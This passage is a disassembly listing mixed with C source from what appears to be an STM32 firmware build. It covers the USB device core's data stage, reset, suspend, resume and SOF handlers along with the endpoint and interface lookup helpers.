 800b38e:	e002      	b.n	800b396 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b390:	2300      	movs	r3, #0
 800b392:	75bb      	strb	r3, [r7, #22]
            break;
 800b394:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b396:	7dbb      	ldrb	r3, [r7, #22]
 800b398:	2b00      	cmp	r3, #0
 800b39a:	d119      	bne.n	800b3d0 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b39c:	68fb      	ldr	r3, [r7, #12]
 800b39e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3a2:	b2db      	uxtb	r3, r3
 800b3a4:	2b03      	cmp	r3, #3
 800b3a6:	d113      	bne.n	800b3d0 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b3a8:	7dba      	ldrb	r2, [r7, #22]
 800b3aa:	68fb      	ldr	r3, [r7, #12]
 800b3ac:	32ae      	adds	r2, #174	; 0xae
 800b3ae:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b3b2:	691b      	ldr	r3, [r3, #16]
 800b3b4:	2b00      	cmp	r3, #0
 800b3b6:	d00b      	beq.n	800b3d0 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b3b8:	7dba      	ldrb	r2, [r7, #22]
 800b3ba:	68fb      	ldr	r3, [r7, #12]
 800b3bc:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b3c0:	7dba      	ldrb	r2, [r7, #22]
 800b3c2:	68fb      	ldr	r3, [r7, #12]
 800b3c4:	32ae      	adds	r2, #174	; 0xae
 800b3c6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b3ca:	691b      	ldr	r3, [r3, #16]
 800b3cc:	68f8      	ldr	r0, [r7, #12]
 800b3ce:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b3d0:	68f8      	ldr	r0, [r7, #12]
 800b3d2:	f001 f8e9 	bl	800c5a8 <USBD_CtlSendStatus>
 800b3d6:	e032      	b.n	800b43e <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b3d8:	7afb      	ldrb	r3, [r7, #11]
 800b3da:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b3de:	b2db      	uxtb	r3, r3
 800b3e0:	4619      	mov	r1, r3
 800b3e2:	68f8      	ldr	r0, [r7, #12]
 800b3e4:	f000 f9a5 	bl	800b732 <USBD_CoreFindEP>
 800b3e8:	4603      	mov	r3, r0
 800b3ea:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b3ec:	7dbb      	ldrb	r3, [r7, #22]
 800b3ee:	2bff      	cmp	r3, #255	; 0xff
 800b3f0:	d025      	beq.n	800b43e <USBD_LL_DataOutStage+0x15c>
 800b3f2:	7dbb      	ldrb	r3, [r7, #22]
 800b3f4:	2b00      	cmp	r3, #0
 800b3f6:	d122      	bne.n	800b43e <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b3f8:	68fb      	ldr	r3, [r7, #12]
 800b3fa:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3fe:	b2db      	uxtb	r3, r3
 800b400:	2b03      	cmp	r3, #3
 800b402:	d117      	bne.n	800b434 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b404:	7dba      	ldrb	r2, [r7, #22]
 800b406:	68fb      	ldr	r3, [r7, #12]
 800b408:	32ae      	adds	r2, #174	; 0xae
 800b40a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b40e:	699b      	ldr	r3, [r3, #24]
 800b410:	2b00      	cmp	r3, #0
 800b412:	d00f      	beq.n	800b434 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b414:	7dba      	ldrb	r2, [r7, #22]
 800b416:	68fb      	ldr	r3, [r7, #12]
 800b418:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b41c:	7dba      	ldrb	r2, [r7, #22]
 800b41e:	68fb      	ldr	r3, [r7, #12]
 800b420:	32ae      	adds	r2, #174	; 0xae
 800b422:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b426:	699b      	ldr	r3, [r3, #24]
 800b428:	7afa      	ldrb	r2, [r7, #11]
 800b42a:	4611      	mov	r1, r2
 800b42c:	68f8      	ldr	r0, [r7, #12]
 800b42e:	4798      	blx	r3
 800b430:	4603      	mov	r3, r0
 800b432:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b434:	7dfb      	ldrb	r3, [r7, #23]
 800b436:	2b00      	cmp	r3, #0
 800b438:	d001      	beq.n	800b43e <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b43a:	7dfb      	ldrb	r3, [r7, #23]
 800b43c:	e000      	b.n	800b440 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b43e:	2300      	movs	r3, #0
}
 800b440:	4618      	mov	r0, r3
 800b442:	3718      	adds	r7, #24
 800b444:	46bd      	mov	sp, r7
 800b446:	bd80      	pop	{r7, pc}

0800b448 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b448:	b580      	push	{r7, lr}
 800b44a:	b086      	sub	sp, #24
 800b44c:	af00      	add	r7, sp, #0
 800b44e:	60f8      	str	r0, [r7, #12]
 800b450:	460b      	mov	r3, r1
 800b452:	607a      	str	r2, [r7, #4]
 800b454:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b456:	7afb      	ldrb	r3, [r7, #11]
 800b458:	2b00      	cmp	r3, #0
 800b45a:	d16f      	bne.n	800b53c <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b45c:	68fb      	ldr	r3, [r7, #12]
 800b45e:	3314      	adds	r3, #20
 800b460:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b462:	68fb      	ldr	r3, [r7, #12]
 800b464:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b468:	2b02      	cmp	r3, #2
 800b46a:	d15a      	bne.n	800b522 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b46c:	693b      	ldr	r3, [r7, #16]
 800b46e:	689a      	ldr	r2, [r3, #8]
 800b470:	693b      	ldr	r3, [r7, #16]
 800b472:	68db      	ldr	r3, [r3, #12]
 800b474:	429a      	cmp	r2, r3
 800b476:	d914      	bls.n	800b4a2 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b478:	693b      	ldr	r3, [r7, #16]
 800b47a:	689a      	ldr	r2, [r3, #8]
 800b47c:	693b      	ldr	r3, [r7, #16]
 800b47e:	68db      	ldr	r3, [r3, #12]
 800b480:	1ad2      	subs	r2, r2, r3
 800b482:	693b      	ldr	r3, [r7, #16]
 800b484:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b486:	693b      	ldr	r3, [r7, #16]
 800b488:	689b      	ldr	r3, [r3, #8]
 800b48a:	461a      	mov	r2, r3
 800b48c:	6879      	ldr	r1, [r7, #4]
 800b48e:	68f8      	ldr	r0, [r7, #12]
 800b490:	f001 f84b 	bl	800c52a <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b494:	2300      	movs	r3, #0
 800b496:	2200      	movs	r2, #0
 800b498:	2100      	movs	r1, #0
 800b49a:	68f8      	ldr	r0, [r7, #12]
 800b49c:	f001 fe34 	bl	800d108 <USBD_LL_PrepareReceive>
 800b4a0:	e03f      	b.n	800b522 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b4a2:	693b      	ldr	r3, [r7, #16]
 800b4a4:	68da      	ldr	r2, [r3, #12]
 800b4a6:	693b      	ldr	r3, [r7, #16]
 800b4a8:	689b      	ldr	r3, [r3, #8]
 800b4aa:	429a      	cmp	r2, r3
 800b4ac:	d11c      	bne.n	800b4e8 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b4ae:	693b      	ldr	r3, [r7, #16]
 800b4b0:	685a      	ldr	r2, [r3, #4]
 800b4b2:	693b      	ldr	r3, [r7, #16]
 800b4b4:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b4b6:	429a      	cmp	r2, r3
 800b4b8:	d316      	bcc.n	800b4e8 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b4ba:	693b      	ldr	r3, [r7, #16]
 800b4bc:	685a      	ldr	r2, [r3, #4]
 800b4be:	68fb      	ldr	r3, [r7, #12]
 800b4c0:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b4c4:	429a      	cmp	r2, r3
 800b4c6:	d20f      	bcs.n	800b4e8 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b4c8:	2200      	movs	r2, #0
 800b4ca:	2100      	movs	r1, #0
 800b4cc:	68f8      	ldr	r0, [r7, #12]
 800b4ce:	f001 f82c 	bl	800c52a <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b4d2:	68fb      	ldr	r3, [r7, #12]
 800b4d4:	2200      	movs	r2, #0
 800b4d6:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b4da:	2300      	movs	r3, #0
 800b4dc:	2200      	movs	r2, #0
 800b4de:	2100      	movs	r1, #0
 800b4e0:	68f8      	ldr	r0, [r7, #12]
 800b4e2:	f001 fe11 	bl	800d108 <USBD_LL_PrepareReceive>
 800b4e6:	e01c      	b.n	800b522 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b4e8:	68fb      	ldr	r3, [r7, #12]
 800b4ea:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b4ee:	b2db      	uxtb	r3, r3
 800b4f0:	2b03      	cmp	r3, #3
 800b4f2:	d10f      	bne.n	800b514 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b4f4:	68fb      	ldr	r3, [r7, #12]
 800b4f6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4fa:	68db      	ldr	r3, [r3, #12]
 800b4fc:	2b00      	cmp	r3, #0
 800b4fe:	d009      	beq.n	800b514 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b500:	68fb      	ldr	r3, [r7, #12]
 800b502:	2200      	movs	r2, #0
 800b504:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b508:	68fb      	ldr	r3, [r7, #12]
 800b50a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b50e:	68db      	ldr	r3, [r3, #12]
 800b510:	68f8      	ldr	r0, [r7, #12]
 800b512:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b514:	2180      	movs	r1, #128	; 0x80
 800b516:	68f8      	ldr	r0, [r7, #12]
 800b518:	f001 fcee 	bl	800cef8 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b51c:	68f8      	ldr	r0, [r7, #12]
 800b51e:	f001 f856 	bl	800c5ce <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b522:	68fb      	ldr	r3, [r7, #12]
 800b524:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b528:	2b00      	cmp	r3, #0
 800b52a:	d03a      	beq.n	800b5a2 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b52c:	68f8      	ldr	r0, [r7, #12]
 800b52e:	f7ff fe42 	bl	800b1b6 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b532:	68fb      	ldr	r3, [r7, #12]
 800b534:	2200      	movs	r2, #0
 800b536:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b53a:	e032      	b.n	800b5a2 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b53c:	7afb      	ldrb	r3, [r7, #11]
 800b53e:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b542:	b2db      	uxtb	r3, r3
 800b544:	4619      	mov	r1, r3
 800b546:	68f8      	ldr	r0, [r7, #12]
 800b548:	f000 f8f3 	bl	800b732 <USBD_CoreFindEP>
 800b54c:	4603      	mov	r3, r0
 800b54e:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b550:	7dfb      	ldrb	r3, [r7, #23]
 800b552:	2bff      	cmp	r3, #255	; 0xff
 800b554:	d025      	beq.n	800b5a2 <USBD_LL_DataInStage+0x15a>
 800b556:	7dfb      	ldrb	r3, [r7, #23]
 800b558:	2b00      	cmp	r3, #0
 800b55a:	d122      	bne.n	800b5a2 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b55c:	68fb      	ldr	r3, [r7, #12]
 800b55e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b562:	b2db      	uxtb	r3, r3
 800b564:	2b03      	cmp	r3, #3
 800b566:	d11c      	bne.n	800b5a2 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b568:	7dfa      	ldrb	r2, [r7, #23]
 800b56a:	68fb      	ldr	r3, [r7, #12]
 800b56c:	32ae      	adds	r2, #174	; 0xae
 800b56e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b572:	695b      	ldr	r3, [r3, #20]
 800b574:	2b00      	cmp	r3, #0
 800b576:	d014      	beq.n	800b5a2 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b578:	7dfa      	ldrb	r2, [r7, #23]
 800b57a:	68fb      	ldr	r3, [r7, #12]
 800b57c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b580:	7dfa      	ldrb	r2, [r7, #23]
 800b582:	68fb      	ldr	r3, [r7, #12]
 800b584:	32ae      	adds	r2, #174	; 0xae
 800b586:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b58a:	695b      	ldr	r3, [r3, #20]
 800b58c:	7afa      	ldrb	r2, [r7, #11]
 800b58e:	4611      	mov	r1, r2
 800b590:	68f8      	ldr	r0, [r7, #12]
 800b592:	4798      	blx	r3
 800b594:	4603      	mov	r3, r0
 800b596:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b598:	7dbb      	ldrb	r3, [r7, #22]
 800b59a:	2b00      	cmp	r3, #0
 800b59c:	d001      	beq.n	800b5a2 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b59e:	7dbb      	ldrb	r3, [r7, #22]
 800b5a0:	e000      	b.n	800b5a4 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b5a2:	2300      	movs	r3, #0
}
 800b5a4:	4618      	mov	r0, r3
 800b5a6:	3718      	adds	r7, #24
 800b5a8:	46bd      	mov	sp, r7
 800b5aa:	bd80      	pop	{r7, pc}

0800b5ac <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b5ac:	b580      	push	{r7, lr}
 800b5ae:	b084      	sub	sp, #16
 800b5b0:	af00      	add	r7, sp, #0
 800b5b2:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b5b4:	2300      	movs	r3, #0
 800b5b6:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b5b8:	687b      	ldr	r3, [r7, #4]
 800b5ba:	2201      	movs	r2, #1
 800b5bc:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b5c0:	687b      	ldr	r3, [r7, #4]
 800b5c2:	2200      	movs	r2, #0
 800b5c4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b5c8:	687b      	ldr	r3, [r7, #4]
 800b5ca:	2200      	movs	r2, #0
 800b5cc:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b5ce:	687b      	ldr	r3, [r7, #4]
 800b5d0:	2200      	movs	r2, #0
 800b5d2:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b5d6:	687b      	ldr	r3, [r7, #4]
 800b5d8:	2200      	movs	r2, #0
 800b5da:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b5de:	687b      	ldr	r3, [r7, #4]
 800b5e0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b5e4:	2b00      	cmp	r3, #0
 800b5e6:	d014      	beq.n	800b612 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b5e8:	687b      	ldr	r3, [r7, #4]
 800b5ea:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b5ee:	685b      	ldr	r3, [r3, #4]
 800b5f0:	2b00      	cmp	r3, #0
 800b5f2:	d00e      	beq.n	800b612 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b5f4:	687b      	ldr	r3, [r7, #4]
 800b5f6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b5fa:	685b      	ldr	r3, [r3, #4]
 800b5fc:	687a      	ldr	r2, [r7, #4]
 800b5fe:	6852      	ldr	r2, [r2, #4]
 800b600:	b2d2      	uxtb	r2, r2
 800b602:	4611      	mov	r1, r2
 800b604:	6878      	ldr	r0, [r7, #4]
 800b606:	4798      	blx	r3
 800b608:	4603      	mov	r3, r0
 800b60a:	2b00      	cmp	r3, #0
 800b60c:	d001      	beq.n	800b612 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b60e:	2303      	movs	r3, #3
 800b610:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b612:	2340      	movs	r3, #64	; 0x40
 800b614:	2200      	movs	r2, #0
 800b616:	2100      	movs	r1, #0
 800b618:	6878      	ldr	r0, [r7, #4]
 800b61a:	f001 fbc3 	bl	800cda4 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b61e:	687b      	ldr	r3, [r7, #4]
 800b620:	2201      	movs	r2, #1
 800b622:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b626:	687b      	ldr	r3, [r7, #4]
 800b628:	2240      	movs	r2, #64	; 0x40
 800b62a:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b62e:	2340      	movs	r3, #64	; 0x40
 800b630:	2200      	movs	r2, #0
 800b632:	2180      	movs	r1, #128	; 0x80
 800b634:	6878      	ldr	r0, [r7, #4]
 800b636:	f001 fbb5 	bl	800cda4 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b63a:	687b      	ldr	r3, [r7, #4]
 800b63c:	2201      	movs	r2, #1
 800b63e:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b640:	687b      	ldr	r3, [r7, #4]
 800b642:	2240      	movs	r2, #64	; 0x40
 800b644:	621a      	str	r2, [r3, #32]

  return ret;
 800b646:	7bfb      	ldrb	r3, [r7, #15]
}
 800b648:	4618      	mov	r0, r3
 800b64a:	3710      	adds	r7, #16
 800b64c:	46bd      	mov	sp, r7
 800b64e:	bd80      	pop	{r7, pc}

0800b650 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b650:	b480      	push	{r7}
 800b652:	b083      	sub	sp, #12
 800b654:	af00      	add	r7, sp, #0
 800b656:	6078      	str	r0, [r7, #4]
 800b658:	460b      	mov	r3, r1
 800b65a:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b65c:	687b      	ldr	r3, [r7, #4]
 800b65e:	78fa      	ldrb	r2, [r7, #3]
 800b660:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b662:	2300      	movs	r3, #0
}
 800b664:	4618      	mov	r0, r3
 800b666:	370c      	adds	r7, #12
 800b668:	46bd      	mov	sp, r7
 800b66a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b66e:	4770      	bx	lr

0800b670 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b670:	b480      	push	{r7}
 800b672:	b083      	sub	sp, #12
 800b674:	af00      	add	r7, sp, #0
 800b676:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b678:	687b      	ldr	r3, [r7, #4]
 800b67a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b67e:	b2db      	uxtb	r3, r3
 800b680:	2b04      	cmp	r3, #4
 800b682:	d006      	beq.n	800b692 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b684:	687b      	ldr	r3, [r7, #4]
 800b686:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b68a:	b2da      	uxtb	r2, r3
 800b68c:	687b      	ldr	r3, [r7, #4]
 800b68e:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b692:	687b      	ldr	r3, [r7, #4]
 800b694:	2204      	movs	r2, #4
 800b696:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b69a:	2300      	movs	r3, #0
}
 800b69c:	4618      	mov	r0, r3
 800b69e:	370c      	adds	r7, #12
 800b6a0:	46bd      	mov	sp, r7
 800b6a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b6a6:	4770      	bx	lr

0800b6a8 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b6a8:	b480      	push	{r7}
 800b6aa:	b083      	sub	sp, #12
 800b6ac:	af00      	add	r7, sp, #0
 800b6ae:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b6b0:	687b      	ldr	r3, [r7, #4]
 800b6b2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b6b6:	b2db      	uxtb	r3, r3
 800b6b8:	2b04      	cmp	r3, #4
 800b6ba:	d106      	bne.n	800b6ca <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b6bc:	687b      	ldr	r3, [r7, #4]
 800b6be:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b6c2:	b2da      	uxtb	r2, r3
 800b6c4:	687b      	ldr	r3, [r7, #4]
 800b6c6:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b6ca:	2300      	movs	r3, #0
}
 800b6cc:	4618      	mov	r0, r3
 800b6ce:	370c      	adds	r7, #12
 800b6d0:	46bd      	mov	sp, r7
 800b6d2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b6d6:	4770      	bx	lr

0800b6d8 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b6d8:	b580      	push	{r7, lr}
 800b6da:	b082      	sub	sp, #8
 800b6dc:	af00      	add	r7, sp, #0
 800b6de:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b6e0:	687b      	ldr	r3, [r7, #4]
 800b6e2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b6e6:	b2db      	uxtb	r3, r3
 800b6e8:	2b03      	cmp	r3, #3
 800b6ea:	d110      	bne.n	800b70e <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b6ec:	687b      	ldr	r3, [r7, #4]
 800b6ee:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b6f2:	2b00      	cmp	r3, #0
 800b6f4:	d00b      	beq.n	800b70e <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b6f6:	687b      	ldr	r3, [r7, #4]
 800b6f8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b6fc:	69db      	ldr	r3, [r3, #28]
 800b6fe:	2b00      	cmp	r3, #0
 800b700:	d005      	beq.n	800b70e <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b702:	687b      	ldr	r3, [r7, #4]
 800b704:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b708:	69db      	ldr	r3, [r3, #28]
 800b70a:	6878      	ldr	r0, [r7, #4]
 800b70c:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b70e:	2300      	movs	r3, #0
}
 800b710:	4618      	mov	r0, r3
 800b712:	3708      	adds	r7, #8
 800b714:	46bd      	mov	sp, r7
 800b716:	bd80      	pop	{r7, pc}

0800b718 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b718:	b480      	push	{r7}
 800b71a:	b083      	sub	sp, #12
 800b71c:	af00      	add	r7, sp, #0
 800b71e:	6078      	str	r0, [r7, #4]
 800b720:	460b      	mov	r3, r1
 800b722:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b724:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b726:	4618      	mov	r0, r3
 800b728:	370c      	adds	r7, #12
 800b72a:	46bd      	mov	sp, r7
 800b72c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b730:	4770      	bx	lr

0800b732 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b732:	b480      	push	{r7}
 800b734:	b083      	sub	sp, #12
 800b736:	af00      	add	r7, sp, #0
 800b738:	6078      	str	r0, [r7, #4]
 800b73a:	460b      	mov	r3, r1
 800b73c:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b73e:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b740:	4618      	mov	r0, r3
 800b742:	370c      	adds	r7, #12
 800b744:	46bd      	mov	sp, r7
 800b746:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b74a:	4770      	bx	lr

0800b74c <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b74c:	b580      	push	{r7, lr}
